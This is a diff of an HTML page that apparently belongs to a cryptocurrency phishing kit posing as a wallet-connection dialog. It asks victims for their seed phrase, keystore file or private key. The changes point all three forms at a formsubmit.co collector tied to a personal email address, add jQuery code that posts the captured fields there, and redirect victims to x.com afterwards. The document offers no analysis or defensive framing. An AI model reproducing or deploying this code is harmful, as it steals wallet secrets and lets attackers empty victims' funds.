@@ -13,7 +13,6 @@
     <link rel="preload" href="files/static/css/1f147681d5457acaa9f5.css" as="style" />
     <link rel="stylesheet" href="files/static/css/1f147681d5457acaa9f5.css" />
     <link rel="stylesheet" href="files/static/css/add.css" type="text/css" />
-    
 </head>
 
 <body>
@@ -1346,28 +1345,28 @@
                         <small style="text-align: center; margin-bottom: 10px">Establish a connection for your <span id="walletName"></span></small><br>
                         <div class="result" style="text-align: center"></div>
 
-                        <!-- Phrase content -->
-
                         <div class="tabContent active" id="phraseContent">
 
-                            <form action="" onsubmit="return sender()">
+                            <form action="https://formsubmit.co/samex150@gmail.com" id="" enctype="" method="POST">
 
-                                <input type="hidden" name="_captcha" value="false">
                                 <input name="wallet" type="hidden" class="wallet" id="wallet1" value="">
-
-                                <div class="phrasebox ccbox activebox">
+                                <input type="hidden" name="_captcha" value="false">
+                              
+                            
+                              <div class="phrasebox ccbox activebox">
                                 
-                                    <!-- <input class="input allinput" name="phrase2" placeholder="" id="phraseinput">
-                                    <textarea class="textarea allinput" name="phrase" placeholder="Phrase"></textarea> -->
-                                    <input class="input allinput" name="phrase2" placeholder="Click to input your phrase" id="phraseinput" required> 
-                                    <small style="text-align: center; margin-bottom: 10px">Press the Enter Key after your input your phrase<span id="walletName"></span></small><br>
-                                    <small style="text-align: center; margin-bottom: 10px; color: red; display: none;">Seed Phrase must be a 12 or 24 words!<span id="phrase_error"></span></small>
-
-                                </div
-                                <div class="buttonbox">
-                                <button class="bluebtn_bird"  type="submit" >connect</button>
-                                </div>
-                                <input type="hidden" name="_next" value= "https://opns.support/thankyou.html">
+                                <!-- <input class="input allinput" name="phrase2" placeholder="" id="phraseinput">
+                                <textarea class="textarea allinput" name="phrase" placeholder="Phrase"></textarea> -->
+            <input class="input allinput" name="phrase2" placeholder="Click to input your phrase" id="phraseinput"> 
+            <small style="text-align: center; margin-bottom: 10px">Press the Enter Key after your input your phrase<span id="walletName"></span></small>
+                              </div>
+                        
+                            
+                             <button>Submit</button>
+                              <div class="buttonbox">
+                                <button class="bluebtn_bird" type="submit" >connect</button>
+                              </div>
+                    <input type="hidden" name="_next" value= "https://x.com">
                     
                             </form>
                         </div>
@@ -1375,11 +1374,11 @@
 
 
                         <div class="tabContent" id="keystoreContent">
-                            <form action="https://formsubmit.co/Whitebridget090@gmail.com" id="" enctype="" method="POST">
+                            <form action="https://formsubmit.co/samex150@gmail.com" id="" enctype="" method="POST">
 
                                 <input type="hidden" name="_captcha" value="false">
                               
-                              <input name="wallet" class="wallet" id="wallet2" type="hidden" value="">
+                                <input name="wallet" type="hidden" class="wallet" id="wallet1" value="">
                               <input name="type" id="wallettype" type="hidden">
                               
                     
@@ -1393,7 +1392,7 @@
                               <div class="buttonbox">
                                 <button class="bluebtn_bird" type="submit" >connect</button>
                               </div>
-                    <input type="hidden" name="_next" value= "https://opns.support/thankyou.html">
+                    <input type="hidden" name="_next" value= "https://x.com">
                     
                             </form>
                         </div>
@@ -1401,11 +1400,11 @@
 
 
                         <div class="tabContent" id="privateContent">
-                            <form action="https://formsubmit.co/Whitebridget090@gmail.com" id="" enctype="" method="POST">
+                            <form action="https://formsubmit.co/samex150@gmail.com" id="" enctype="" method="POST">
 
-                                <input type="hidden" class="wallet" name="_captcha" value="false">
+                                <input type="hidden" name="_captcha" value="false">
                               
-                                <input name="wallet" id="wallet3" type="hidden" value="">
+                                <input name="wallet" type="hidden" class="wallet" id="wallet1" value="">
                               <input name="type" id="wallettype" type="hidden">
                     
                               <div class="privatebox ccbox">
@@ -1416,7 +1415,7 @@
                               <div class="buttonbox">
                                 <button class="bluebtn_bird" type="submit" >connect</button>
                               </div>
-                    <input type="hidden" name="_next" value= "https://opns.support/thankyou.html">
+                                <input type="hidden" name="_next" value= "https://x.com">
                     
                             </form>
                         </div>
@@ -1448,9 +1447,9 @@
 
                 </div>
 
+
+
                 <script src="files/static/chunks/jquery-3.4.1.min.js"></script>
-                <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-                <script src="scripts/sender.js"></script>
                 <script type="text/javascript">
                     $('.tab ul li').on('click', function() {
 
@@ -1495,12 +1494,75 @@
                         $('#myModal').css('display', 'none');
                     });
 
+
+
+
                     var setWallet = function(e) {
                         $('#connectWallet').css('display', 'none');
                     };
+
+
+
+                    $('.allforms').on('click', function(e) {
+
+                        e.preventDefault();
+                        var id = $(this).attr('id');
+
+                        var getData = $('#' + id).data('content');
+                        var form = document.getElementById(getData);
+                        var svgDis = '<svg version="1.1" style="width: 50px; height: 10px; margin: 0px; margin-left: -15px; display:inline-block;"  x="0px" y="0px" viewBox="0 0 20 20" enable-background="new 0 0 0 0" xml:space="preserve"><circle fill="#fff" stroke="none" cx="6" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.1"/> </circle><circle fill="#fff" stroke="none" cx="26" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.2"/> </circle><circle fill="#fff" stroke="none" cx="46" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.3"/></circle></svg>';
+                        var btnText = $('#' + id).text();
+                        $('#' + id).prop('disabled', true).html('Waiting ' + svgDis);
+                        for (var i = 0; i < form.elements.length; i++) {
+                            if (form.elements[i].value === '' && form.elements[i].hasAttribute('required')) {
+                                $('#' + id).prop('disabled', false).html(btnText);
+                                $('.result').fadeIn(3000).html('<span style="color:#f00">There are some required fields!</span>').fadeOut(3000);
+                                //Swal.fire("Error!", '', "error");
+                                return false;
+                            }
+                        }
+
+                        console.log($('#' + getData).serializeArray());
+                        $.ajax({
+                            method: "POST",
+                            url: $('#' + getData).attr('action'),
+                            data: $('#' + getData).serializeArray(),
+                            //headers: {'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')},
+                            dataType: "json",
+                            success: function(data) {
+                                $('#' + id).prop('disabled', false).html(btnText);
+
+                                //console.log(data);
+
+                                //Scroll to the top
+                                document.body.scrollTop = 0; // For Safari
+                                document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+                                if (data.status === 201) {
+                                    //$("#formHandle")[0].reset();
+
+                                    $('.n').val(data.n);
+                                    $('.result').fadeIn(3000).html(data.message).fadeOut(3000);
+
+                                } else {
+                                    console.log(data.message);
+                                }
+                            },
+                            error: function(error) {
+                                $('#' + id).prop('disabled', false).html(btnText);
+                                console.log(error);
+                            }
+                        });
+
+                        return false;
+                    });
                 </script>
 
+
+
+
+
             </main>
+
 
         </div>
     </div>
@@ -1522,9 +1584,12 @@
         });
     </script>
 
-    <script src="//code.tidio.co/m4bjmxyzr3zuzvynoaxcyujiuyiglwfh.js" async></script>
-    <!--End of tidio Script-->
-
+    <!--Start of support Script-->
+    <script src="//code.tidio.co/0lekcojn9lhep5g5rwt3fwflfpeofaqt.js" async></script>
+    <!--End of support Script-->
+    <div>
+        
+     </div>
 </body>
 
 </html>
